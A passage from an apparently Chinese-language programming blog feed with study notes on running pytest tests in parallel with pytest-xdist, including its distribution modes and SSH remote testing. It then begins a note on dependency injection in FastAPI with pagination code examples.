class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">============================= test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span> -- /home/wang/code/fastApiStudy/venvadmin/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/wang/code/<br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span>, dependency-<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>, ordering-<span class="hljs-number">0.6</span>, rerunfailures-<span class="hljs-number">14.0</span><br>collecting ... collected <span class="hljs-number">1</span> item<br><br>testcases/test_rerun.py::test_02 SKIPPED (test_02 depends on test_01) <span class="hljs-comment"># test_02 依赖 test_01</span><br><br>============================== <span class="hljs-number">1</span> skipped <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ==============================<br>Finished running tests!<br></code></pre></td></tr></table></figure><h3 id="分布式测试-pytest-xdist"><a href="#分布式测试-pytest-xdist" class="headerlink" title="分布式测试(pytest-xdist)"></a>分布式测试(pytest-xdist)</h3><p>pytest-xdist 插件使用新的测试执行模式扩展了 pytest，最常用的是将测试分布在多个 CPU 核心上以加速测试执行： 核心&#x3D;进程</p><p>安装：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install pytest-xdist<br><span class="hljs-comment"># 要使用 psutil 检测可用 CPU 的数量，请额外安装 psutil，一般不需要</span><br>pip install pytest-xdist[psutil]<br></code></pre></td></tr></table></figure><p>使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pytest -n auto test_xxx.py<br></code></pre></td></tr></table></figure><p>这个命令行中，pytest 将生成数量等于可用 CPU 数量的工作进程，并在它们之间随机分配测试，比如说你cpu是20核的，最大分配20个进程数</p><blockquote><p>由于 pytest-xdist 的实现方式， 当命令行中使用了 -s&#x2F;–capture&#x3D;no 选项是不起作用的。也就是说终端不会打印你的print内容，也无法禁用捕获</p></blockquote><p>特征：</p><ul><li><p>跨多个 CPU 运行测试：可以跨多个 CPU 或主机执行测试。或使用SSH进行远程账户调用。</p></li><li><p><code>--looponfail</code>：在子进程中重复运行测试。每次运行后 pytest 都会等待，直到项目中的文件发生更改，然后重新运行之前失败的测试。重复此操作，直到所有测试通过，然后再次执行完整运行（已弃用）。</p></li><li><p>向远程 SSH 帐户发送测试覆盖范围：您可以指定不同的 Python 解释器或不同的平台，并在所有这些平台上并行运行测试。</p></li></ul><p>在远程运行测试之前，pytest 会有效地将程序源代码“rsync”到远程位置。可以指定不同的 Python 版本和解释器。但是，它不会安装&#x2F;同步依赖项。</p><p>注意：这种模式的存在主要是为了向后兼容，因为现代开发依赖于多平台测试的持续集成。</p><h2 id="跨多个-CPU-运行测试"><a href="#跨多个-CPU-运行测试" class="headerlink" title="跨多个 CPU 运行测试"></a>跨多个 CPU 运行测试</h2><p>要将测试发送到多个 CPU进程中执行，使用 <code>-n</code> （或 <code>--numprocesses</code>）命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pytest -n auto<br></code></pre></td></tr></table></figure><ul><li><p>使用<code>-n auto</code>时，<code>pytest-xdist </code>将使用与本机具有 CPU 内核一样多的进程 【默认常用】</p></li><li><p>使用<code> -n logical</code>可使用逻辑 CPU 核心数而不是物理核心数。当前需要安装 psutil 软件包；如果没用，pytest-xdist 将回退到 -n auto 行为。【用得少】这里不多讲</p></li><li><p>使用<code>-n 8</code>时，指定8个进程执行</p></li><li><p>也可以直接接到<code>pytest.ini</code>文件当中去 <code>addopts = -n auto</code></p></li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[pytest]</span><br><span class="hljs-attr">addopts</span> = -s -v -n auto<br></code></pre></td></tr></table></figure><p>给一段测试用例：用默认并发测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_case1</span>():<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;看看会不会打印：case1&quot;</span>) <span class="hljs-comment"># 会禁用-s 所以不会打印</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_case2</span>():<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;看看会不会打印：case2&quot;</span>) <span class="hljs-comment"># 会禁用-s 所以不会打印</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_case3</span>():<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;看看会不会打印：case3&quot;</span>) <span class="hljs-comment"># 会禁用-s 所以不会打印</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_case4</span>():<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;看看会不会打印：case4&quot;</span>) <span class="hljs-comment"># 会禁用-s 所以不会打印</span><br></code></pre></td></tr></table></figure><p>测试结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">============================= test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span> -- /home/wang/code/fastApiStudy/venvadmin/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/wang/code/<br>configfile: pytest.ini<br>plugins: xdist-<span class="hljs-number">3.5</span><span class="hljs-number">.0</span>, anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span>, dependency-<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>, ordering-<span class="hljs-number">0.6</span>, Faker-<span class="hljs-number">24.9</span><span class="hljs-number">.0</span>, rerunfailures-<span class="hljs-number">14.0</span><br>created: <span class="hljs-number">20</span>/<span class="hljs-number">20</span> workers <span class="hljs-comment"># 创建了20个wokers 这里的20个 是你的cpu核心数，也就是进程数</span><br><span class="hljs-number">20</span> workers [<span class="hljs-number">4</span> items] <span class="hljs-comment"># 20个进程4个项目</span><br><br>scheduling tests via LoadScheduling<br><br>testcases/test_xdits_case.py::test_case4 <br>testcases/test_xdits_case.py::test_case1 <br>testcases/test_xdits_case.py::test_case2 <br>testcases/test_xdits_case.py::test_case3 <br><span class="hljs-comment"># 这里可以看到分配了4个进程去执行</span><br>[gw3] PASSED testcases/test_xdits_case.py::test_case4  <span class="hljs-comment"># gw3 就是指gevent worker 3</span><br>[gw1] PASSED testcases/test_xdits_case.py::test_case2 <br>[gw2] PASSED testcases/test_xdits_case.py::test_case3 <br>[gw0] PASSED testcases/test_xdits_case.py::test_case1 <br><br>============================== <span class="hljs-number">4</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">1.93</span>s ===============================<br>Finished running tests!<br><span class="hljs-comment"># 如过-n 是 2 的话</span><br>============================= test session starts ==============================<br>.........<br>created: <span class="hljs-number">2</span>/<span class="hljs-number">2</span> workers<br><span class="hljs-number">2</span> workers [<span class="hljs-number">4</span> items] <span class="hljs-comment"># 2个进程</span><br><br>scheduling tests via LoadScheduling<br><br>testcases/test_xdits_case.py::test_case3 <br>testcases/test_xdits_case.py::test_case1 <br>[gw1] PASSED testcases/test_xdits_case.py::test_case3 <br>[gw0] PASSED testcases/test_xdits_case.py::test_case1 <br>testcases/test_xdits_case.py::test_case2 <br>testcases/test_xdits_case.py::test_case4 <br>[gw1] PASSED testcases/test_xdits_case.py::test_case4 <br>[gw0] PASSED testcases/test_xdits_case.py::test_case2 <br><br>============================== <span class="hljs-number">4</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">2.28</span>s ===============================<br></code></pre></td></tr></table></figure><p>可以使用以下选项进一步配置并发：</p><ul><li><code>--maxprocesses=maxprocesses</code>: 设置最大进程数–工人数  这个和<code>-n</code> 所指定的是一个意思 </li><li><code>--max-worker-restart</code>: 崩溃时可以重新启动的最大工作线程数（设置为零以禁用此功能）。</li></ul><p><code>--dist</code>设定用于控制分布式测试中的测试用例加载和分发方式。它提供了不同的选项来控制测试用例的加载和分发行为，以满足不同的需求。(distribution)</p><ul><li><p><code>--dist load</code> <strong>(默认)</strong>: 将挂起的测试发送给任何可用的worker工作线程，但是顺序是不固定的。可以使用 <code>–maxschedchunk </code>选项进行微调来调整，请参阅 pytest –help 的输出。</p></li><li><p><code>——dist loadscope</code>: 在主进程中加载和运行测试用例，然后将测试用例按照其作用域（scope）分发到工作进程。这种方式可以更好地控制测试用例的加载行为，特别是在使用_fixture_等 pytest 功能时。按类分组优先于按模块分组。看代码：</p></li><li><pre><code class="python">import timeimport pytestclass TestScope1: # 一个类算一个级别        def test_case1(self):        time.sleep(1)        print(&quot;看看会不会打印：case1&quot;)            def test_case2(self):        time.sleep(1)        print(&quot;看看会不会打印：case2&quot;)                class TestScope2:        def test_case3(self):        time.sleep(1)        print(&quot;看看会不会打印：case3&quot;)    def test_case4(self):        time.sleep(1)        print(&quot;看看会不会打印：case4&quot;)def test_case5(): # 一个方法算一个级别        time.sleep(1)        print(&quot;看看会不会打印：case4&quot;)# 分析下测试结果============================= test session starts ==============================........created: 20/20 workers20 workers [5 items] scheduling tests via LoadScopeSchedulingtestcases/test_xdits_case.py::TestScope1::test_case1 testcases/test_xdits_case.py::test_case5 testcases/test_xdits_case.py::TestScope2::test_case3 [gw2] PASSED testcases/test_xdits_case.py::test_case5  # gw2 来测test_case5[gw1] PASSED testcases/test_xdits_case.py::TestScope2::test_case3  # gw1 来测TestScope2[gw0] PASSED testcases/test_xdits_case.py::TestScope1::test_case1  # gw0 来测TestScope1testcases/test_xdits_case.py::TestScope1::test_case2 testcases/test_xdits_case.py::TestScope2::test_case4 [gw1] PASSED testcases/test_xdits_case.py::TestScope2::test_case4 # gw1 来测TestScope2[gw0] PASSED testcases/test_xdits_case.py::TestScope1::test_case2 # gw0 来测TestScope1# 总共分了3个进程去做测试，一个类一个进程，一个方法一个进程，============================== 5 passed in 2.94s ===============================<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><br>- `——dist loadgroup`<span class="hljs-symbol">:</span>对测试用例按`xdist_group标记`分组。以组为单位分配给可用的worker工人。这保证了具有相同`xdist_group标记`的所有测试都在同一工作线程中运行。如下：<br><br>```python<br><br>class <span class="hljs-symbol">TestScope1:</span><br>    <span class="hljs-variable">@pytest</span>.mark.xdist_group(<span class="hljs-string">&quot;group1&quot;</span>)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_case1</span></span>(self):<br>        time.sleep(<span class="hljs-number">1</span>)<br>        print(<span class="hljs-string">&quot;看看会不会打印：case1&quot;</span>)<br>        <br>    <span class="hljs-variable">@pytest</span>.mark.xdist_group(<span class="hljs-string">&quot;group2&quot;</span>)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_case2</span></span>(self):<br>        time.sleep(<span class="hljs-number">1</span>)<br>        print(<span class="hljs-string">&quot;看看会不会打印：case2&quot;</span>)<br>        <br>        <br>class <span class="hljs-symbol">TestScope2:</span>    <br>    <span class="hljs-variable">@pytest</span>.mark.xdist_group(<span class="hljs-string">&quot;group2&quot;</span>)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_case3</span></span>(self):<br>        time.sleep(<span class="hljs-number">1</span>)<br>        print(<span class="hljs-string">&quot;看看会不会打印：case3&quot;</span>)<br>    <span class="hljs-variable">@pytest</span>.mark.xdist_group(<span class="hljs-string">&quot;group1&quot;</span>)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_case4</span></span>(self):<br>        time.sleep(<span class="hljs-number">1</span>)<br>        print(<span class="hljs-string">&quot;看看会不会打印：case4&quot;</span>)<br><span class="hljs-variable">@pytest</span>.mark.xdist_group(<span class="hljs-string">&quot;group2&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_case5</span></span>():<br>        time.sleep(<span class="hljs-number">1</span>)<br>        print(<span class="hljs-string">&quot;看看会不会打印：case4&quot;</span>)<br><span class="hljs-comment"># 测试结果分析一下</span><br>============================ test session starts ==============================<br>............<br><span class="hljs-symbol">created:</span> <span class="hljs-number">20</span>/<span class="hljs-number">20</span> workers<br><span class="hljs-number">20</span> workers [<span class="hljs-number">5</span> items]<br><br>scheduling tests via <span class="hljs-title class_">LoadGroupScheduling</span><br><span class="hljs-comment"># 这里就很明显了，可以看到对应的测试被分到对应的组去运行了</span><br>testcases/test_xdits_case.py::<span class="hljs-title class_">TestScope1</span>::test_case1<span class="hljs-variable">@group1</span> <br>testcases/test_xdits_case.py::<span class="hljs-title class_">TestScope1</span>::test_case2<span class="hljs-variable">@group2</span> <br>[gw0] <span class="hljs-title class_">PASSED</span> testcases/test_xdits_case.py::<span class="hljs-title class_">TestScope1</span>::test_case2<span class="hljs-variable">@group2</span>  <span class="hljs-comment"># 组2</span><br>[gw1] <span class="hljs-title class_">PASSED</span> testcases/test_xdits_case.py::<span class="hljs-title class_">TestScope1</span>::test_case1<span class="hljs-variable">@group1</span> <br>testcases/test_xdits_case.py::<span class="hljs-title class_">TestScope2</span>::test_case3<span class="hljs-variable">@group2</span> <br>testcases/test_xdits_case.py::<span class="hljs-title class_">TestScope2</span>::test_case4<span class="hljs-variable">@group1</span> <br>[gw0] <span class="hljs-title class_">PASSED</span> testcases/test_xdits_case.py::<span class="hljs-title class_">TestScope2</span>::test_case3<span class="hljs-variable">@group2</span> <br>testcases/test_xdits_case.py::test_case5<span class="hljs-variable">@group2</span> <br>[gw1] <span class="hljs-title class_">PASSED</span> testcases/test_xdits_case.py::<span class="hljs-title class_">TestScope2</span>::test_case4<span class="hljs-variable">@group1</span> <br>[gw0] <span class="hljs-title class_">PASSED</span> testcases/test_xdits_case.py::test_case5<span class="hljs-variable">@group2</span> <br><br>============================== <span class="hljs-number">5</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">3.96</span>s ===============================<br><span class="hljs-comment"># 这将确保 test1 和 TestA::test2 将在同一个工作线程中运行。没有 xdist_group 标记的测试按照 --dist=load 模式正常分发。</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p><code>——dist worksteal:</code> 最开始的时候，测试用例会被均匀的分配给可用的woker中，当工作线程完成了大部分分配的测试用例并且没有足够的测试用例来继续(当前每个工作线程在其队列中至少需要两个测试)时，将会尝试从其他工作线程的队列中重新分配(“窃取”)一部分测试用例来跑。运行结果与<code>--dist load</code>方法相似，但是<code>worksteal</code>可以更好地处理持续时间明显不同的测试用例，同时，它可以提供类似或更好的fixtures重用。——这个代码不好演示，大致的意思就是进程1和2都有100条用例，但是1先跑完了，那1就会去窃取2的用例过来跑，</p></li><li><p><code>--dist no</code>: 正常的pytest执行模式，一次运行一个测试(根本没有分发)。禁用分发</p></li></ul><p>当我们测试用例非常多的时候，比如有1千条用例，假设每个用例执行需要1分钟，如果单个会话去测试，就需要1000分钟才能跑完</p><p>使用该插件可以并发去执行，</p><p>要求：</p><ul><li>各个用例之间互相独立，没有依赖，可完全独立运行</li><li>没有顺序要求</li><li>可重复运行，且运行结果互不影响</li></ul><h2 id="远程-SSH-分布式测试"><a href="#远程-SSH-分布式测试" class="headerlink" title="远程 SSH 分布式测试"></a>远程 SSH 分布式测试</h2><h3 id="远程-SSH-分布式测试-1"><a href="#远程-SSH-分布式测试-1" class="headerlink" title="远程 SSH 分布式测试"></a>远程 SSH 分布式测试</h3><blockquote><p>官方文档说即将被弃用</p></blockquote><p>假设您有一个包mypkg，其中包含一些可以在本地成功运行的测试。你有一个ssh可达的机器myhost。然后，您可以通过键入:</p><p>使用方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pytest -d  --rsyncdir mypkg --tx ssh=myhostpopen mypkg/tests/unit/test_something.py<br></code></pre></td></tr></table></figure><p>可以使用<code>——rsyncdir</code>指定要发送到远程端的多个目录。</p><p>为了使pytest正确地收集和发送测试，您不仅需要确保所有代码和测试目录都是同步的，而且任何测试(子)目录也都有一个__init__.py文件，因为pytest内部将tests引用为完全限定的python模块路径。否则，您将在远程端设置过程中得到奇怪的错误。</p><h3 id="将测试发送到远程套接字服务器"><a href="#将测试发送到远程套接字服务器" class="headerlink" title="将测试发送到远程套接字服务器"></a>将测试发送到远程套接字服务器</h3><p>没有尝试过，就不写了，感觉也不常用</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
      <tag>pytest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】FastAPI依赖注入（四）</title>
    <link href="/2024/01/18/684FastAPI4%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/01/18/684FastAPI4%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="7-1-什么是依赖注入"><a href="#7-1-什么是依赖注入" class="headerlink" title="7-1 什么是依赖注入"></a>7-1 什么是依赖注入</h1><p>场景： </p><p>你的一个网站有两个查询接口，一个是图书列表借口，一个是用户列表借口，两个接口有相同的分页查询逻辑，此时你该如何实现？ 看看下面的普通代码实现方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI<br><br>app = FastAPI()<br><br><br>BOOKS = [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;book<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: i % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br>USERS = [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;user<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: i % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/api/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-number">2</span>, status: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):  <span class="hljs-comment"># 需要定义三个参数 page\size\status</span><br>    books = [b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> BOOKS <span class="hljs-keyword">if</span> b[<span class="hljs-string">&quot;status&quot;</span>] == status]<br>    <span class="hljs-keyword">return</span> books[(page - <span class="hljs-number">1</span>) * size:page * size]<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/api/users&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-number">2</span>, status: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):  <span class="hljs-comment"># 需要重复再次定义三个参数 代码重复写了</span><br>    users = [u <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> USERS <span class="hljs-keyword">if</span> u[<span class="hljs-string">&quot;status&quot;</span>] == status]<br>    retur<br></code></pre></td></tr></table></figure><ul><li><p>对于上面的代码重复问题，我们可以使用依赖注入解决</p></li><li><p>依赖注入其实就是英文单词 <strong>Dependency Injection</strong> 的翻译，它是一种非常简单且直观的工具。<strong>简单来说，就是当你的代码中的一个参数的值需要依赖其他条件时，可以使用依赖注入。当你使用了它之后，FastAPI就会在需要使用这个参数的时候，自动帮你执行它的依赖条件来获取结果。</strong></p><ul><li>函数的入参需要符合某一种规范（所谓依赖）。</li></ul></li></ul><h2 id="依赖注入的使用"><a href="#依赖注入的使用" class="headerlink" title="依赖注入的使用"></a>依赖注入的使用</h2><p>首先，从FastAPI引入<code>Depends</code></p><p>然后，定义依赖条件，即定义一个函数（可调用对象即可），函数的形参是我们需要的参数，返回值是三个参数组成的字典</p><p>最后，在路径函数内使用 <code>Depends(common_params)</code>, 这样一来FastAPI就知道，<code>commons</code>这个字典依赖<code>common_params</code>函数的返回值，即<code>commons</code>字典就是<code>common_params</code>函数的返回值。</p><p>像<code>common_params</code>函数被称为依赖条件，<strong>只要是可调用对象就可以当依赖条件</strong></p><p>依赖条件中可以使用Path\Query等等获取参数的方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Depends<br><br>app = FastAPI()<br><br><br>BOOKS = [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;book<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: i % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br>USERS = [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;user<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: i % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br><br><br><span class="hljs-comment"># 定义依赖条件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">common_params</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-number">2</span>, status: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span></span>):<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;page&quot;</span>: page,<br>        <span class="hljs-string">&quot;size&quot;</span>: size,<br>        <span class="hljs-string">&quot;status&quot;</span>: status,<br>    &#125;<br><br><span class="hljs-comment"># 下面两个路径函数都是使用了上面定义的依赖条件，依赖条件函数的入参就是洗面路径函数的入参要求，且默认值就是其默认值</span><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/api/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params">commons: <span class="hljs-built_in">dict</span> = Depends(<span class="hljs-params">common_params</span>)</span>):<span class="hljs-comment"># 使用依赖条件</span><br>    page = commons[<span class="hljs-string">&quot;page&quot;</span>]<br>    size = commons[<span class="hljs-string">&quot;size&quot;</span>]<br>    status = commons[<span class="hljs-string">&quot;status&quot;</span>]<br>    books = [b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> BOOKS <span class="hljs-keyword">if</span> b[<span class="hljs-string">&quot;status&quot;</span>] == status]<br>    <span class="hljs-keyword">return</span> books[(page - <span class="hljs-number">1</span>) * size:page * size]<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/api/users&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>(<span class="hljs-params">commons: <span class="hljs-built_in">dict</span> = Depends(<span class="hljs-params">common_params</span>)</span>):<br>    page = commons[<span class="hljs-string">&quot;page&quot;</span>]<br>    size = commons[<span class="hljs-string">&quot;size&quot;</span>]<br>    status = commons[<span class="hljs-string">&quot;status&quot;</span>]<br>    users = [u <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> USERS <span class="hljs-keyword">if</span> u[<span class="hljs-string">&quot;status&quot;</span>] == status]<br>    <span class="hljs-keyword">return</span> users[(page - <span class="hljs-number">1</span>) * size:page * size]<br></code></pre></td></tr></table></figure><p><strong>依赖注入的用途</strong>：</p><ul><li>共享一块相同逻辑的代码块</li><li>共享数据库连接</li><li>权限认证，登录状态认证</li><li>等等等</li></ul><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="7-2-依赖注入嵌套使用【】"><a href="#7-2-依赖注入嵌套使用【】" class="headerlink" title="7-2 依赖注入嵌套使用【】"></a>7-2 